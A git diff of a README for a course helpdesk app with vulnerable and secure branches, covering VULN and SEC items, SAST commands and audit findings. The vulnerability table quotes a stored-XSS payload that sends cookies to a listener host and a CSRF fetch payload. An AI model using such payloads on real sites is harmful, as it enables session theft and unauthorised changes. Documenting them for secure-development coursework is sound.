@@ -58,7 +58,7 @@ helpdesk/
 │   │   ├── services/        # Business logic
 │   │   ├── routes/          # Route registration and management
 │   │   └── requests/        # Request and validation structs
-|   |   ├── response/        # Response struct
+|   |   ├── response/        # Response management
 │   ├── migrations/          # SQL migrations (using Goose)
 │   ├── seed/                # Optional seed data for immediate testing
 │   ├── makefile             # Makefile for easy command execution
@@ -73,7 +73,7 @@ helpdesk/
 │   │   └── utils/           # Shared helpers
 │   ├── vite.config.ts
 │   └── package.json
-└── README.md                  # This file
+└── README.md                # Setup Instruction and general app info
 ```
 ---
 
@@ -149,54 +149,91 @@ Open the URL printed by Vite (typically `http://localhost:3000`).
 
 ## Security improvements (vulnerabilities addressed)
 
-The project follows a structured remediation plan aligned with the course **VULN-01 … VULN-06** themes. Summary:
+The project follows a structured vulnerability and remediation plan **VULN-01 … VULN-06** labels on the vuln-baseline branch, with matching improvement IDs **SEC-01 … SEC-06** on the secure branch.
 
-| ID | Topic | Risk | Remediation summary |
-|----|-------|------|---------------------|
-| **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Set **`HttpOnly=true`**, **`Secure=true`** in production (HTTPS) while local `Secure=false`, consistent **`SameSite=strict`** |
-| **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Prefer **`GET/PATCH /api/users/me`** only; enforce **ticket access policy** such that only owner or admin can access tickets. Replace ID with **UUID** |
-| **VULN-03** | Stored XSS | User content executed as HTML | At backend **`TrimSpace`** on text fields; render ticket/comment bodies as **plain text** (no `v-html` (in frontend) on user-controlled fields) |
-| **VULN-04** | CSRF | Cross-site form posts mutate state | **`CSRFRequired`**: compare **`X-CSRF-Token`** to session token with **constant-time** equality before `c.Next()` |
-| **VULN-05** | Weak audit trail | No forensic trail for incidents | **`audit_logs`** (append-only), actor from **session only**, optional metadata; no secrets in log payloads |
-| **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | **Parameterization** of search query |
+### Vulnerabilities
 
-Code locations are tagged with `// VULN-…` e.g **//VULN-01** in the vulnerability branch(vulnerable-baseline); then replaced with tags with `// SEC-…` e.g **//SEC-01** in secure-fix brach.
+| ID | Topic | Risk | Vulnerability summary |
+|----|-------|------|-------------------------|
+| **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Session cookies **`HttpOnly=false`**, **`Secure=false`**, exposing tokens to script access, insecure transport. |
+| **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Clients may reference guessable resource IDs; the API does not enforce **ownership or role** before returning or mutating another user’s profile or ticket. |
+| **VULN-03** | Stored XSS | User content executed as HTML | Ticket or comment text is rendered as **HTML** in the UI (**v-html**) or passed unsafely into templates, allowing **stored script** execution in victims’ browsers e.g `<img src=x onerror="new Image().src='http://127.0.0.1:4444/?c='+encodeURIComponent(document.cookie)">` |
+| **VULN-04** | CSRF | Cross-site form posts mutate state | State-changing requests accept **session cookies** without a **bound anti-CSRF token** to the session, allowing malicious sites to trigger actions with invalid csrf tokens. e.g `<img src=x onerror='fetch("http://127.0.0.1:5000/api/tickets/4",{method:"PATCH",credentials:"include",headers:{"Content-Type":"application/json","X-CSRF-Token":"invalid-xxx"},body:JSON.stringify({description:"You have been pwned."})})'` |
+| **VULN-05** | Weak audit trail | No forensic trail for incidents | Sensitive actions may leave **no footprint** of actor, action, and outcome, hindering detection, incident review and non-repudiation. |
+| **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | User search input may be **concatenated into SQL strings**, allowing **injection** and unintended data access or modification. |
+
+### Improvements
+
+| ID | Topic | Improvement summary |
+|----|-------|---------------------|
+| **SEC-01** | Session cookie flags | Set **`HttpOnly=true`**, **`Secure=true`** in production (HTTPS) while local `Secure=false`, consistent **`SameSite=strict`**; same flags when clearing cookies. |
+| **SEC-02** | IDOR | Prefer **`GET/PATCH /api/users/me`** only; enforce **ticket access policy** so only owner or admin can access tickets; use **UUID** identifiers where appropriate. |
+| **SEC-03** | Stored XSS | **`TrimSpace`** on text fields at the backend; render ticket/comment bodies as **plain text** in the frontend (**no `v-html`** on user-controlled fields). |
+| **SEC-04** | CSRF | **`CSRFRequired`** middleware: compare **`X-CSRF-Token`** to the session token with **constant-time** equality before `c.Next()`. |
+| **SEC-05** | Weak audit trail | **`audit_logs`** in append-only mode, actor from **session only**, optional metadata; **no secrets** in log payloads. |
+| **SEC-06** | SQL injection (search) | **Parameterized** search queries (GORM placeholders); no raw concatenation of user input into SQL. |
+
+Code locations are tagged with `// VULN-…` (e.g. **`// VULN-01`**) on the vulnerability branch (**`vulnerable-baseline`**), then replaced with **`// SEC-…`** (e.g. **`// SEC-01`**) on **`secure-fix`**.
 
 ---
 
-## Testing process (Work In Progress)
+## Testing process
 
-Testing is required to cover **functional** behaviour and **static analysis (SAST)**.
+Security validation combines **Go SAST** (**gosec**), **Go dependency** analysis (**govulncheck**), **npm** dependency audit, **lint**, and **manual functional** checks (sessions, CSRF, authorization, safe search). Reports are saved under **`sast/`**.
 
-| Type | Tool / method | What to record |
-|------|----------------|----------------|
-| **SAST (Go)** | `gosec ./...` from `backend/` | Summary of findings; fix or document accepted risk |
-| **SAST / lint (JS)** | `npm run lint` in `frontend/`; optional **Semgrep** or **ESLint** security plugins | Output snippet in report appendix |
-| **Dependencies** | `npm audit` (frontend); **`govulncheck ./...`** (backend) | High/critical issues and upgrades planned |
-| **Functional security** | Manual or scripted tests | Cookie flags, 403 on IDOR, 403 on bad CSRF, safe search with metacharacters |
-
-Example commands:
+### Install CLI tools (once)
 
 ```bash
-# Backend — install gosec: go install github.com/securego/gosec/v2/cmd/gosec@latest
-cd backend && gosec ./...
-
-# Go vulnerability check
-cd backend && govulncheck ./...
-
-# Frontend
-cd frontend && npm audit
-cd frontend && npm run lint
+go install github.com/securego/gosec/v2/cmd/gosec@latest
+go install golang.org/x/vuln/cmd/govulncheck@latest
 ```
 
-Summarize **key findings** (pass/fail, severity, file paths) in your report and README as they change over time.
+Ensure `$(go env GOPATH)/bin` is on your **`PATH`**.
+
+### Backend (`cd backend`)
+
+```bash
+cd backend
+gosec -fmt json -out ../sast/gosec-report-vuln.json ./...
+govulncheck -json ./... > ../sast/backend-govulncheck.json
+```
+
+After fixes, gosec was rerun to a clean report, for example:
+
+```bash
+gosec -fmt json -out ../sast/gosec-report-vuln-fixed.json ./...
+```
+
+**`govulncheck`** reported no known reachable vulnerabilities against the scanned **`go.mod`** in the last run (**`sast/backend-govulncheck.json`**).
+
+### Frontend (`cd frontend`)
+
+```bash
+cd frontend
+npm audit --json > ../sast/frontend-npm-audit-vuln.json
+npm audit fix
+npm audit --json > ../sast/frontend-npm-audit-vuln-fix.json
+npm run lint
+# To fix lint issues
+npm run lint -- --fix
+```
+
+### Key findings (summary)
+
+| Tool | Findings & fix |
+|------|----------------|
+| **gosec** | **`sast/gosec-report-vuln.json`**: **G115** (`int`→`uint32` in Argon2 helpers), **G203** (`template.HTML` in email HTML). To **Fix:** create help to convert int to `uint32` conversion; email layout split so plain text is template-escaped. **`sast/gosec-report-vuln-fixed.json`**: **0** issues. |
+| **govulncheck** | No vulnerable **Go** dependencies reported, check **`sast/backend-govulncheck.json`**. |
+| **npm audit** | Vulnerabilities listed in **`sast/frontend-npm-audit-vuln.json`** (e.g. **TypeScript-ESLint** chain); addressed with **`npm audit fix`**, captured in **`sast/frontend-npm-audit-vuln-fix.json`**. |
+| **Functional** | Manual checks: cookies, 403 on forbidden access, CSRF rejection, safe search — detailed in the CA report. |
+
+**Supplementary checks (optionally):** **Semgrep** and **Snyk** were also run for a general pattern and dependency view across frontend/backend, the output JSON is in **`sast/`**.
 
 ---
 
 ## Contributions and references
 
 - **Author / course:** Developed as part of **NCI MSCCYB — Secure Web Development** (Continuous Assessment). **Contributors:** see Git commit history; this repository is the canonical source for the helpdesk project.
-- **No upstream “forked app”** — application code is authored for the module; **third-party libraries** are used under their respective **open-source licences** (see `go.mod` and `package.json`).
 
 **Frameworks and libraries (non-exhaustive)**
 
@@ -206,9 +243,10 @@ Summarize **key findings** (pass/fail, severity, file paths) in your report and 
 | ORM | [GORM](https://gorm.io/) |
 | Migrations | [Goose](https://github.com/pressly/goose) |
 | Frontend | [Vue.js](https://vuejs.org/), [Vite](https://vitejs.dev/), [Vue Router](https://router.vuejs.org/) |
-| Password hashing | [golang.org/x/crypto](https://pkg.go.dev/golang.org/x/crypto/argon2) (Argon2) |
+| Password hashing | [golang.org/x/crypto](https://pkg.go.dev/golang.org/x/crypto) (Argon2) |
 |Argon2d Implementation|[How to Hash and Verify Passwords with Argon2 in Go](https://www.alexedwards.net/blog/how-to-hash-and-verify-passwords-with-argon2-in-go)
-| Tokens | [PASETO](https://github.com/o1egl/paseto)
+| Tokens | [PASETO](https://github.com/o1egl/paseto) |
+|MySQL Databae|
 
 **Security guidance (for design and report citations)**
 
@@ -221,10 +259,6 @@ Summarize **key findings** (pass/fail, severity, file paths) in your report and 
 
 ## Repository hygiene
 
-- Prefer **small, meaningful commits** over a single dump before deadlines.
-- Keep **`.env` out of git**; use secrets only via environment or a secrets manager in production.
-- Run **`go fmt`**, **`go test ./...`**, **`npm run lint`**, and **`gosec`** before tagging a release or submitting assessment work.
-
----
-
-*Last updated to align with NCI CA README expectations: overview, structure, setup, usage, security improvements, testing, and references.*
+- Prefer **small, meaningful commits** over larg commits
+- Keep **`.env` out of git**
+- Run **`go fmt`**, **`go test ./...`**, **`gosec`**, **`govulncheck`**, **`npm audit`**, and **`npm run lint`** before submitting assessment work.
